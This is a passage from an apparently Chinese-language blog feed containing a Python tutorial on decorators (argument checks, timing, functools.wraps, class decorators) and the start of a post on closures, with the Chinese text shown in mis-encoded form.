æ¯ä¸ªpythonå‡½æ•°ä¸­éƒ½æœ‰ä¸€ä¸ª__name__å±æ€§,é™¤éç‰¹åˆ«æŒ‡å®š,å¦åˆ™ç±»çš„å¯¹è±¡ä¸å…·æœ‰æ­¤å±æ€§</code></pre><p>OutPut:</p><pre><code>&lt;p&gt;&lt;p&gt;ä½ å–œæ¬¢å¼ ä¸‰&lt;/p&gt;&lt;/p&gt;func_wrapper</code></pre><p>ç¬¬äºŒä¸ªä¾‹å­:</p><pre><code># -*- coding: utf-8 -*-&quot;&quot;&quot;   File Name:è£…é¥°å™¨å®ç°2   Dateï¼š2018/12/3   Change Activity:2018/12/3   Description:   è£…é¥°å™¨æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°,æ·»åŠ åŠŸèƒ½å¹¶è¿”å›å®ƒ&quot;&quot;&quot;def make_pretty(func):    def inner():        print(&quot;å·²è£…é¥°&quot;)        print(&quot;è°ƒç”¨ä¼ é€’è¿‡æ¥çš„å‡½æ•°&quot;)        func()    return inner@make_pretty        # ç­‰ä»·äº:make_pretty(ordinary)def ordinary():    &quot;&quot;&quot;æ™®é€šå‡½æ•°&quot;&quot;&quot;    print(&quot;è¿™æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°&quot;)# ordinary()# ordinary = make_pretty(ordinary)      # è£…é¥°å™¨æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°,æ·»åŠ åŠŸèƒ½å¹¶è¿”å›è¿™ä¸ªå‡½æ•°,è¿”å›çš„å‡½æ•°è¢«å‘½åä¸ºprettyordinary()</code></pre><h2 id="ä½¿ç”¨è£…é¥°å™¨è£…é¥°å¸¦æœ‰å‚æ•°çš„å‡½æ•°"><a href="#ä½¿ç”¨è£…é¥°å™¨è£…é¥°å¸¦æœ‰å‚æ•°çš„å‡½æ•°" class="headerlink" title="ä½¿ç”¨è£…é¥°å™¨è£…é¥°å¸¦æœ‰å‚æ•°çš„å‡½æ•°"></a>ä½¿ç”¨è£…é¥°å™¨è£…é¥°å¸¦æœ‰å‚æ•°çš„å‡½æ•°</h2><p>divideæ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°,è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯è¿”å›ä»–çš„ä¸¤ä¸ªå‚æ•°ç›¸é™¤çš„ç»“æœ,ä½†æ˜¯åœ¨æ•°å­¦ä¸­æˆ‘ä»¬çŸ¥é“,é™¤æ•°æ˜¯ä¸èƒ½ä¸º0çš„,å¦‚æœæˆ‘ä»¬å°†0ä½œä¸ºé™¤æ•°ä¼ é€’ç»™å‡½æ•°,é‚£ä¹ˆè‚¯å®šä¼šæŠ¥é”™çš„.æˆ‘ä»¬å¦‚ä½•è§£å†³è¿™æ ·çš„é—®é¢˜å‘¢?ç­”æ¡ˆå°±æ˜¯ä½¿ç”¨è£…é¥°å™¨,è®©è£…é¥°å™¨å»æ£€æŸ¥ä¼ é€’ç»™divideçš„å‚æ•°.</p><pre><code>def smart_divide(func):    def inner(a, b):        print(&#39;å¯¹bè¿›è¡Œåˆ¤æ–­&#39;)        if b == 0:            print(&#39;bç­‰äº0&#39;)            return &#39;è®¡ç®—é”™è¯¯&#39;        else:            print(&#39;bæ²¡æœ‰ç­‰äº0,å¯ä»¥æ‰§è¡Œè®¡ç®—&#39;)            return func(a, b)    return inner@smart_dividedef divide(a, b):    return a / bprint(divide(10, 2))print(divide(10, 0))</code></pre><p>OutPut:</p><pre><code>å¯¹bè¿›è¡Œåˆ¤æ–­bæ²¡æœ‰ç­‰äº0,å¯ä»¥æ‰§è¡Œè®¡ç®—5.0å¯¹bè¿›è¡Œåˆ¤æ–­bç­‰äº0è®¡ç®—é”™è¯¯</code></pre><p>åœ¨ä¸Šé¢çš„ä¾‹å­(divide)ä¸­,æˆ‘ä»¬çš„è£…é¥°å™¨(inner)åªèƒ½ä¼ é€’ä¸¤ä¸ªå›ºå®šçš„å‚æ•°,ä½†æ˜¯å¦‚æœæˆ‘ä»¬éœ€è¦ä¼ é€’å¤šä¸ªå‚æ•°è¯¥æ€ä¹ˆåŠå‘¢?ç­”æ¡ˆå°±æ˜¯ä½¿ç”¨*args,å’Œ**kwargs,è¿™ä¸¤ä¸ªå‡½æ•°çš„å‚æ•°ä¸€ä¸ªæ˜¯è¿”å›å…ƒç»„,ä¸€ä¸ªæ˜¯è¿”å›å­—å…¸.æˆ‘ä»¬å¯ä»¥åœ¨ä¼ é€’ç»™innerçš„æ—¶å€™è¿›è¡Œä¼ é€’è¿™ä¸¤ä¸ªå‚æ•°,åœ¨è°ƒç”¨çš„æ—¶å€™<strong>å¯¹è¿™ä¸¤ä¸ªç‰¹æ®Šçš„å‚æ•°è¿›è¡Œè§£åŒ…</strong></p><pre><code>def smart_divide(func):    def inner(*args, **kwargs):        print(&#39;å¯¹bè¿›è¡Œåˆ¤æ–­&#39;)        if args == 0 or kwargs == 0:            print(&#39;bç­‰äº0&#39;)            return &#39;è®¡ç®—é”™è¯¯&#39;        else:            print(&#39;bæ²¡æœ‰ç­‰äº0,å¯ä»¥æ‰§è¡Œè®¡ç®—&#39;)            return func(*args, **kwargs)        # è§£åŒ…    return inner@smart_dividedef divide(a, b):    return a / b</code></pre><h2 id="è£…é¥°å™¨å¸¦æœ‰å‚æ•°"><a href="#è£…é¥°å™¨å¸¦æœ‰å‚æ•°" class="headerlink" title="è£…é¥°å™¨å¸¦æœ‰å‚æ•°"></a>è£…é¥°å™¨å¸¦æœ‰å‚æ•°</h2><p>å½“è£…é¥°å™¨å¸¦æœ‰å‚æ•°çš„æ—¶å€™,æˆ‘ä»¬æœ€é‡è¦çš„æ˜¯è¦æ˜ç™½å‚æ•°ä¹‹é—´çš„è°ƒç”¨,</p><pre><code>def tags(tag_name):    def tags_decorator(func):        def func_wrapper(name):            return f&#39;&lt;{tag_name}&gt;{func(name)}&lt;/{tag_name}&gt;&#39;        return func_wrapper    return tags_decorator@tags(&quot;a&quot;)        # ç»™è£…é¥°å™¨ä¼ é€’å‚æ•°def get_text(name):    return f&quot;Hello{name}&quot;print(get_text(&quot;å¼ ä¸‰&quot;))</code></pre><p>OutPut</p><pre><code>&lt;a&gt;Helloå¼ ä¸‰&lt;/a&gt;</code></pre><p><strong>ç¬¬äºŒä¸ªä¾‹å­</strong></p><pre><code>def set_parent(num):    &quot;&quot;&quot;ä¿å­˜ä¼ é€’è¿‡æ¥çš„å‚æ•°(num = 1)&quot;&quot;&quot;    def set_func(func):        &quot;&quot;&quot;ä¿å­˜ä¼ é€’è¿‡æ¥çš„å‚æ•°(Tst1çš„å¼•ç”¨)&quot;&quot;&quot;        def call_func(*args, **kwargs):            &quot;&quot;&quot;è°ƒç”¨Tst1çš„å¼•ç”¨,ä½¿ç”¨æœ€å¤–å±‚çš„å€¼&quot;&quot;&quot;            if num == 1:                print(&quot;æƒé™éªŒè¯1---&quot;)            else:                print(&#39;æƒé™éªŒè¯2---&#39;)            return func()        return call_func    return set_func@set_parent(1)  # 1è°ƒç”¨set_funcå¹¶ä¸”å°†1å½“ä½œå®å‚ä¼ é€’.2ç”¨ä¸Šä¸€æ­¥è°ƒç”¨çš„è¿”å›å€¼å½“ä½œè£…é¥°å™¨å¯¹Tst1å‡½æ•°è¿›è¡Œè£…é¥°def Tst1():    print(&quot;test1&quot;)    return &quot;OK&quot;@set_parent(2)def Tst2():    print(&#39;test2&#39;)    return &#39;OK&#39;if __name__ == &#39;__main__&#39;:    Tst1()    Tst2()</code></pre><p>OutPut</p><pre><code>æƒé™éªŒè¯1---test1æƒé™éªŒè¯2---test2</code></pre><h2 id="å¯¹å®ä¾‹æ–¹æ³•è¿›è¡Œè£…é¥°"><a href="#å¯¹å®ä¾‹æ–¹æ³•è¿›è¡Œè£…é¥°" class="headerlink" title="å¯¹å®ä¾‹æ–¹æ³•è¿›è¡Œè£…é¥°"></a>å¯¹å®ä¾‹æ–¹æ³•è¿›è¡Œè£…é¥°</h2><pre><code>def p_decorate(func):    def func_wrapper(self):        return f&#39;&lt;p&gt;{func(self)}&lt;/p&gt;&#39;    return func_wrapperclass Person(object):    def __init__(self):        &#39;&#39;&#39;åˆå§‹åŒ–æ–¹æ³•,é€šè¿‡ç±»åˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨æ‰§è¡Œ&#39;&#39;&#39;        self.name = &quot;å¼ ä¸‰&quot;        self.age = 18        self.family = &#39;ä¸­å›½æ²³å—&#39;    @p_decorate    def get_fullname(self):        return f&#39;åœ°å€:{self.family}\tåå­—:{self.name}\tå¹´é¾„:{self.age}&#39;new_Person = Person()       #å®ä¾‹åŒ–å¯¹è±¡print(new_Person.get_fullname())</code></pre><p>OutPut</p><pre><code>&lt;p&gt;åœ°å€:ä¸­å›½æ²³å—    åå­—:å¼ ä¸‰    å¹´é¾„:18&lt;/p&gt;</code></pre><h2 id="ä½¿ç”¨è£…é¥°å™¨ç»Ÿè®¡å‡½æ•°è¿è¡Œæ—¶é—´"><a href="#ä½¿ç”¨è£…é¥°å™¨ç»Ÿè®¡å‡½æ•°è¿è¡Œæ—¶é—´" class="headerlink" title="ä½¿ç”¨è£…é¥°å™¨ç»Ÿè®¡å‡½æ•°è¿è¡Œæ—¶é—´"></a>ä½¿ç”¨è£…é¥°å™¨ç»Ÿè®¡å‡½æ•°è¿è¡Œæ—¶é—´</h2><pre><code>import timedef set_func(fun):    def call_func():        start_time = time.time()        fun()        stop_time = time.time()        print(&quot;è¿è¡Œæ—¶é—´%f&quot; % (stop_time - start_time))    return call_func@set_funcdef ceshi():    print(&quot;-------æµ‹è¯•å‡½æ•°--------&quot;)    for i in range(100000000):        passceshi()</code></pre><p>OutPut</p><pre><code>-------æµ‹è¯•å‡½æ•°--------è¿è¡Œæ—¶é—´1.851081</code></pre><h2 id="å¯¹ä¸å®šé•¿å‚æ•°çš„å‡½æ•°è¿›è¡Œè£…é¥°"><a href="#å¯¹ä¸å®šé•¿å‚æ•°çš„å‡½æ•°è¿›è¡Œè£…é¥°" class="headerlink" title="å¯¹ä¸å®šé•¿å‚æ•°çš„å‡½æ•°è¿›è¡Œè£…é¥°"></a>å¯¹ä¸å®šé•¿å‚æ•°çš„å‡½æ•°è¿›è¡Œè£…é¥°</h2><pre><code>def set_func(func):    def call_func(*args, **kwargs):        print(&quot;------å†…éƒ¨å‡½æ•°------&quot;)        func(*args, **kwargs)       # è§£åŒ…    return call_func@set_funcdef ceshi1(num, *args, **kwargs):    print(&#39;------------Num1:-----------%d&#39; % num)    print(&#39;------------Num1:-----------&#39;, args)    print(&#39;------------Num1:-----------&#39;, kwargs)ceshi1(100)ceshi1(100, 200)ceshi1(100, 200, 3300, mm=1000)</code></pre><p>OutPut</p><pre><code>------å†…éƒ¨å‡½æ•°------------------Num1:-----------100------------Num1:----------- ()------------Num1:----------- {}------å†…éƒ¨å‡½æ•°------------------Num1:-----------100------------Num1:----------- (200,)------------Num1:----------- {}------å†…éƒ¨å‡½æ•°------------------Num1:-----------100------------Num1:----------- (200, 3300)------------Num1:----------- {&#39;mm&#39;: 1000}</code></pre><h2 id="å¯¹å¸¦æœ‰ä¸å®šé•¿è¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°"><a href="#å¯¹å¸¦æœ‰ä¸å®šé•¿è¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°" class="headerlink" title="å¯¹å¸¦æœ‰ä¸å®šé•¿è¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°"></a>å¯¹å¸¦æœ‰ä¸å®šé•¿è¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°</h2><pre><code>def set_func(func):    def call_func(*args, **kwargs):        print(&quot;------å†…éƒ¨å‡½æ•°------&quot;)        return func(*args, **kwargs)    return call_func@set_funcdef ceshi1(num, *args, **kwargs):    print(&#39;------------Num1:-----------%d&#39; % num)    print(&#39;------------Num1:-----------&#39;, args)    print(&#39;------------Num1:-----------&#39;, kwargs)    return &quot;OK&quot;,&quot;æµ‹è¯•&quot;,num,args,kwargs  # ceshi1å‡½æ•°çš„è¿”å›å€¼,è¿”å›ç»™call_func@set_funcdef ceshi2():    passreturn_value = ceshi1(100,666,name = &quot;å¼ ä¸‰&quot;,age=&#39;æå››&#39;)print(return_value)test = ceshi2()print(test)</code></pre><p>OutPut</p><pre><code>------å†…éƒ¨å‡½æ•°------------------Num1:-----------100------------Num1:----------- (666,)------------Num1:----------- {&#39;name&#39;: &#39;å¼ ä¸‰&#39;, &#39;age&#39;: &#39;æå››&#39;}(&#39;OK&#39;, &#39;æµ‹è¯•&#39;, 100, (666,), {&#39;name&#39;: &#39;å¼ ä¸‰&#39;, &#39;age&#39;: &#39;æå››&#39;})------å†…éƒ¨å‡½æ•°------None</code></pre><h2 id="å¯¹å¸¦æœ‰å‚æ•°ä»¥åŠè¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°"><a href="#å¯¹å¸¦æœ‰å‚æ•°ä»¥åŠè¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°" class="headerlink" title="å¯¹å¸¦æœ‰å‚æ•°ä»¥åŠè¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°"></a>å¯¹å¸¦æœ‰å‚æ•°ä»¥åŠè¿”å›å€¼çš„å‡½æ•°è¿›è¡Œè£…é¥°</h2><pre><code>def set_func(func):    def call_func(a):        return func(a)    return call_func@set_func  # ç­‰ä»·äºceshi = set_func(ceshi)def ceshi(num):    return f&quot;-----------æµ‹è¯•%d---------{num}&quot;print(ceshi(999))print(ceshi.__name__)</code></pre><p>OutPut</p><pre><code>-----------æµ‹è¯•%d---------999call_func</code></pre><h2 id="ä½¿ç”¨åŒä¸€ä¸ªè£…é¥°å™¨å¯¹å¤šä¸ªå‡½æ•°è¿›è¡Œè£…é¥°"><a href="#ä½¿ç”¨åŒä¸€ä¸ªè£…é¥°å™¨å¯¹å¤šä¸ªå‡½æ•°è¿›è¡Œè£…é¥°" class="headerlink" title="ä½¿ç”¨åŒä¸€ä¸ªè£…é¥°å™¨å¯¹å¤šä¸ªå‡½æ•°è¿›è¡Œè£…é¥°"></a>ä½¿ç”¨åŒä¸€ä¸ªè£…é¥°å™¨å¯¹å¤šä¸ªå‡½æ•°è¿›è¡Œè£…é¥°</h2><pre><code>def set_func(func):    def call_func(n):        print(&quot;------å†…éƒ¨å‡½æ•°------&quot;)        func(n)    return call_func@set_funcdef ceshi1(num):    print(&#39;------------Num1:-----------%d&#39; % num)@set_funcdef ceshi2(num):    print(&#39;------------Num2:-----------%d&#39; % num)# ceshi = set_func(ceshi1)ceshi1(100)print(ceshi1.__name__)# ceshi2 = set_func(ceshi2)ceshi2(900)print(ceshi2.__name__)</code></pre><p>OutPut</p><pre><code>------å†…éƒ¨å‡½æ•°------------------Num1:-----------100call_func------å†…éƒ¨å‡½æ•°------------------Num2:-----------900call_func</code></pre><h2 id="å¤šä¸ªè£…é¥°å™¨å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œè£…é¥°"><a href="#å¤šä¸ªè£…é¥°å™¨å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œè£…é¥°" class="headerlink" title="å¤šä¸ªè£…é¥°å™¨å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œè£…é¥°"></a>å¤šä¸ªè£…é¥°å™¨å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œè£…é¥°</h2><pre><code>def p_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;è£…é¥°å™¨&#39;&#39;&#39;        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return fun_wrapperdef strong_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;è£…é¥°å™¨&#39;&#39;&#39;        return f&#39;&lt;strong&gt;{func(name)}&lt;/strong&gt;&#39;    return fun_wrapperdef div_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;è£…é¥°å™¨&#39;&#39;&#39;        return f&#39;&lt;div&gt;{func(name)}&lt;/div&gt;&#39;    return fun_wrapperdef get_text(name):    return f&quot;æˆ‘æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯:{name}&quot;get_1 = div_decorate(p_decorate(strong_decorate(get_text)))print(get_1(&quot;Java&quot;))</code></pre><p>OutPut</p><pre><code>&lt;div&gt;&lt;p&gt;&lt;strong&gt;æˆ‘æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯:Java&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;</code></pre><p>å¯¹ä¸Šé¢çš„ä»£ç <strong>ä½¿ç”¨è£…é¥°å™¨çš„è¯­æ³•è¿›è¡Œè£…é¥°.</strong></p><pre><code>def p_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;è£…é¥°å™¨&#39;&#39;&#39;        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return fun_wrapperdef strong_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;è£…é¥°å™¨&#39;&#39;&#39;        return f&#39;&lt;strong&gt;{func(name)}&lt;/strong&gt;&#39;    return fun_wrapperdef div_decorate(func):    def fun_wrapper(name):        &#39;&#39;&#39;è£…é¥°å™¨&#39;&#39;&#39;        return f&#39;&lt;div&gt;{func(name)}&lt;/div&gt;&#39;    return fun_wrapper# å¤šä¸ªè£…é¥°å™¨å¯¹ä¸€ä¸ªå‡½æ•°è¿›è¡Œè£…é¥°çš„è¿‡ç¨‹# ä»ä¸Šåˆ°ä¸‹è¿›è¡Œæ‰§è¡Œ,ä½†æ˜¯è£…é¥°æ˜¯ä»ä¸‹åˆ°ä¸Š@div_decorate@p_decorate@strong_decoratedef get_text(name):    return f&quot;æˆ‘æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯:{name}&quot;print(get_text(&#39;Python&#39;))</code></pre><p>OutPut</p><pre><code>&lt;div&gt;&lt;p&gt;&lt;strong&gt;æˆ‘æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯:Python&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;</code></pre><h2 id="éªŒè¯è£…é¥°å™¨çš„è£…é¥°è¿‡ç¨‹"><a href="#éªŒè¯è£…é¥°å™¨çš„è£…é¥°è¿‡ç¨‹" class="headerlink" title="éªŒè¯è£…é¥°å™¨çš„è£…é¥°è¿‡ç¨‹"></a>éªŒè¯è£…é¥°å™¨çš„è£…é¥°è¿‡ç¨‹</h2><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°,ä¸¤ä¸ªè¢«è£…é¥°çš„å‡½æ•°<strong>ceshi1()</strong>,å’Œ<strong>ceshi2()</strong>,åœ¨æ²¡æœ‰è¢«è°ƒç”¨çš„æ—¶å€™,å°±å·²ç»è¢«è£…é¥°è¿‡äº†.</p><pre><code>def set_func(func):    print(&quot;æµ‹è¯•åœ¨æ²¡æœ‰è°ƒç”¨å‡½æ•°çš„æ—¶å€™è£…é¥°å™¨æ˜¯å¦å·²ç»è£…é¥°äº†&quot;)    def call_func(n):        print(&quot;------å†…éƒ¨å‡½æ•°------&quot;)        func(n)    return call_func@set_funcdef ceshi1(num):    print(&#39;------------Num1:-----------%d&#39; % num)@set_funcdef ceshi2(num):    print(&#39;------------Num2:-----------%d&#39; % num)</code></pre><p>OutPut</p><pre><code>æµ‹è¯•åœ¨æ²¡æœ‰è°ƒç”¨å‡½æ•°çš„æ—¶å€™è£…é¥°å™¨æ˜¯å¦å·²ç»è£…é¥°äº†æµ‹è¯•åœ¨æ²¡æœ‰è°ƒç”¨å‡½æ•°çš„æ—¶å€™è£…é¥°å™¨æ˜¯å¦å·²ç»è£…é¥°äº†</code></pre><h2 id="ä½¿ç”¨ç±»å½“ä½œè£…é¥°å™¨"><a href="#ä½¿ç”¨ç±»å½“ä½œè£…é¥°å™¨" class="headerlink" title="ä½¿ç”¨ç±»å½“ä½œè£…é¥°å™¨"></a>ä½¿ç”¨ç±»å½“ä½œè£…é¥°å™¨</h2><pre><code>class Test(object):    def __init__(self,func):        self.func = func    def __call__(self):        print(&quot;è£…é¥°å™¨è¢«è°ƒç”¨&quot;)        return f&#39;&lt;p&gt;{self.func()}&lt;/p&gt;&#39;@Testdef get_str():    return &quot;I like Python&quot;print(get_str())</code></pre><p>OutPut</p><pre><code>è£…é¥°å™¨è¢«è°ƒç”¨&lt;p&gt;I like Python&lt;/p&gt;</code></pre><h1 id="ä½¿ç”¨Functoolé‡ç½®å‡½æ•°çš„å±æ€§"><a href="#ä½¿ç”¨Functoolé‡ç½®å‡½æ•°çš„å±æ€§" class="headerlink" title="ä½¿ç”¨Functoolé‡ç½®å‡½æ•°çš„å±æ€§"></a>ä½¿ç”¨Functoolé‡ç½®å‡½æ•°çš„å±æ€§</h1><p>Pythonä¸­ä¸‡ç‰©çš†å¯¹è±¡,å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡,ä»–çš„å†…ç½®å±æ€§æœ‰__name__,__doc__,__module__.ä½†æ˜¯å½“æˆ‘ä»¬ä½¿ç”¨è£…é¥°å™¨è£…é¥°æŸå‡½æ•°çš„æ—¶å€™,ä»–çš„å†…ç½®å±æ€§ä¼šè¢«è¦†ç›–.ä¸€ä¸ªç®€å•çš„ä¾‹å­</p><pre><code>def p_docorate(func):    def func_wrapper(name):        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return func_wrapper@p_docoratedef get_text(name):    return f&#39;ä½ å–œæ¬¢{name}&#39;print(get_text.__name__)        # æ¯ä¸ªpythonå‡½æ•°ä¸­éƒ½æœ‰ä¸€ä¸ª__name__å±æ€§,é™¤éç‰¹åˆ«æŒ‡å®š,å¦åˆ™ç±»çš„å¯¹è±¡ä¸å…·æœ‰æ­¤å±æ€§</code></pre><p>OutPut</p><pre><code>func_wrapper</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è¾“å‡ºä¸ºfunc_wrapper,ä¸ºä»€ä¹ˆæˆ‘ä»¬æ˜æ˜æŸ¥çœ‹çš„get_textçš„nameå±æ€§,æœ€åçš„è¾“å‡ºå´æ˜¯func_wrapperå‘¢?é‚£æ˜¯å› ä¸ºå½“æˆ‘ä»¬ä½¿ç”¨è£…é¥°å™¨è£…é¥°get_textå‡½æ•°çš„æ—¶å€™,get_textå‡½æ•°çš„nameå±æ€§è¢«è£…é¥°å™¨è¦†ç›–äº†.ä¸‹é¢æˆ‘ä»¬ä¸ä½¿ç”¨è£…é¥°å™¨æ¥è¯•è¯•.</p><pre><code>def get_text(name):    return f&#39;ä½ å–œæ¬¢{name}&#39;print(get_text.__name__)        </code></pre><p>OutPut</p><pre><code>get_text</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ‰èƒ½ä½¿ç”¨åŸå‡½æ•°çš„å†…ç½®å±æ€§å‘¢?è¢«è£…é¥°åçš„å‡½æ•°æœ¬è´¨ä¸Šå·²ç»ä¸æ˜¯åŸæ¥çš„å‡½æ•°äº†ï¼Œæ‰€ä»¥åŸå‡½æ•°çš„æŸäº›å±æ€§å¦‚ï¼š__name__ã€__doc__ç­‰å€¼å°±å˜äº†ã€‚è€Œ@wraps()çš„ä½œç”¨å°±æ˜¯æŠŠåŸå‡½æ•°çš„ç›¸å…³ä¿¡æ¯ä»£å…¥åˆ°æ–°çš„å‡½æ•°ä¸­ã€‚</p><pre><code>from functools import wrapsdef tags(tag_name):    def tags_decoator(func):        @wraps(func)        def func_wrapper(name):            return f&#39;&lt;{tag_name}&gt;{func(name)}&lt;/{tag_name}&gt;&#39;        return func_wrapper    return tags_decoator@tags(&quot;p&quot;)def get_text(name):    &quot;&quot;&quot;è¿”å›hello name &quot;&quot;&quot;    return f&#39;Hello {name}&#39;print(get_text.__name__)print(get_text.__doc__)print(get_text.__module__)</code></pre><p>OutPut</p><pre><code>get_textè¿”å›hello name __main__</code></pre><h1 id="è£…é¥°å™¨æ•ˆç‡æµ‹è¯•"><a href="#è£…é¥°å™¨æ•ˆç‡æµ‹è¯•" class="headerlink" title="è£…é¥°å™¨æ•ˆç‡æµ‹è¯•"></a>è£…é¥°å™¨æ•ˆç‡æµ‹è¯•</h1><pre><code>import functoolsimport timedef timer(func):    &quot;&quot;&quot;printè¢«è£…é¥°å™¨è£…é¥°çš„å‡½æ•°çš„è¿è¡Œæ—¶é—´&quot;&quot;&quot;    @functools.wraps(func)    def wrapper_timer(*args, **kwargs):        start_time = time.perf_counter()    # 1        value = func(*args, **kwargs)        end_time = time.perf_counter()      # 2        run_time = end_time - start_time    # 3        print(f&quot;Finished {func.__name__!r} in {run_time:.4f} secs&quot;)        return value    return wrapper_timer@timerdef waste_some_time(num_times):    for _ in range(num_times):        sum([i**2 for i in range(10000)])if __name__ == &#39;__main__&#39;:    waste_some_time(999)</code></pre><h1 id="ä½¿ç”¨è£…é¥°å™¨çš„ä¸¤ä¸ªå®ä¾‹"><a href="#ä½¿ç”¨è£…é¥°å™¨çš„ä¸¤ä¸ªå®ä¾‹" class="headerlink" title="ä½¿ç”¨è£…é¥°å™¨çš„ä¸¤ä¸ªå®ä¾‹"></a>ä½¿ç”¨è£…é¥°å™¨çš„ä¸¤ä¸ªå®ä¾‹</h1><p><strong>ä½¿ç”¨è£…é¥°å™¨ç¡®ä¿ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•´æ•°,ä¸æ˜¯æ•´æ•°åˆ™æŠ›å‡ºå¼‚å¸¸</strong></p><pre><code>def argument_test_natural_number(func):    def wrapper(x):        if type(x) == int and x &gt; 0:            return func(x)        else:            raise Exception(&quot;å‚æ•°å¿…é¡»æ˜¯æ•´æ•°&quot;)    return wrapper@argument_test_natural_numberdef factorial(num):    if num == 1:        return 1    else:        return num * factorial(num - 1)for i in range(1, 10):    print(i, factorial(i))print(factorial(-1))</code></pre><p>Output</p><pre><code>æ‰§è¡Œforå¾ªç¯çš„ç»“æœ1 12 23 64 245 1206 7207 50408 403209 362880æ‰§è¡Œprint(factorial(-1))çš„ç»“æœTraceback (most recent call last):  File &quot;L:/TestPythonScriptFolder/è£…é¥°å™¨/è£…é¥°å™¨ä½¿ç”¨å®ä¾‹1.py&quot;, line 32, in &lt;module&gt;    print(factorial(-1))  File &quot;L:/TestPythonScriptFolder/è£…é¥°å™¨/è£…é¥°å™¨ä½¿ç”¨å®ä¾‹1.py&quot;, line 16, in wrapper    raise Exception(&quot;å‚æ•°å¿…é¡»æ˜¯æ•´æ•°&quot;)Exception: å‚æ•°å¿…é¡»æ˜¯æ•´æ•°</code></pre><p><strong>ä½¿ç”¨è£…é¥°å™¨è®¡ç®—å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°</strong></p><pre><code>def call_counter(func):    def wrapper(x):        wrapper.testLove = x        # å‡½æ•°å.xxxæ˜¯å‡½æ•°çš„ä¸€ä¸ªå±æ€§Pythonä¸­çš„æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡(ä¹Ÿå…·æœ‰å±æ€§).        # print(f&#39;å†…éƒ¨å‡½æ•°:{wrapper.calls}&#39;)        # print(id(wrapper.calls))        return func(x)    wrapper.testLove = 0    # print(f&#39;å¤–éƒ¨å‡½æ•°:{wrapper.calls}&#39;)    return wrapper@call_counterdef succ(x):    return x + 1print(succ.testLove)for i in range(10):    succ(10)print(succ.testLove)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythoné—­åŒ…</title>
      <link href="/2018/12/02/python-bi-bao/"/>
      <url>/2018/12/02/python-bi-bao/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯é—­åŒ…"><a href="#ä»€ä¹ˆæ˜¯é—­åŒ…" class="headerlink" title="ä»€ä¹ˆæ˜¯é—­åŒ…"></a>ä»€ä¹ˆæ˜¯é—­åŒ…</h1><p>ç™¾åº¦ç™¾ç§‘:</p><blockquote><p>é—­åŒ…å°±æ˜¯èƒ½å¤Ÿè¯»å–å…¶ä»–å‡½æ•°å†…éƒ¨å˜é‡çš„å‡½æ•°ã€‚</p></blockquote><p>Wikiç™¾ç§‘:</p><blockquote><p>åœ¨ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œé—­åŒ…ï¼ˆä¹Ÿæ˜¯è¯æ³•é—­åŒ…æˆ–å‡½æ•°é—­åŒ…ï¼‰æ˜¯ä¸€ç§åœ¨å…·æœ‰ç¬¬ä¸€ç±»å‡½æ•°çš„è¯­è¨€ä¸­å®ç°è¯æ³•èŒƒå›´çš„ åç§°ç»‘å®šçš„æŠ€æœ¯ã€‚åœ¨æ“ä½œä¸Šï¼Œé—­åŒ…æ˜¯å°†å‡½æ•°ä¸ç¯å¢ƒä¸€èµ·å­˜å‚¨çš„è®°å½•ã€‚ç¯å¢ƒæ˜¯ä¸€ä¸ªæ˜ å°„ï¼Œå®ƒå°†å‡½æ•°çš„æ¯ä¸ªè‡ªç”±å˜é‡ï¼ˆæœ¬åœ°ä½¿ç”¨çš„å˜é‡ï¼Œä½†åœ¨å°é—­èŒƒå›´ä¸­å®šä¹‰ï¼‰ä¸å€¼æˆ–å¼•ç”¨ç›¸å…³è”ã€‚åˆ›å»ºé—­åŒ…æ—¶ç»‘å®šåç§°çš„åç§°ã€‚é—­åŒ… - ä¸æ™®é€šå‡½æ•°ä¸åŒ - 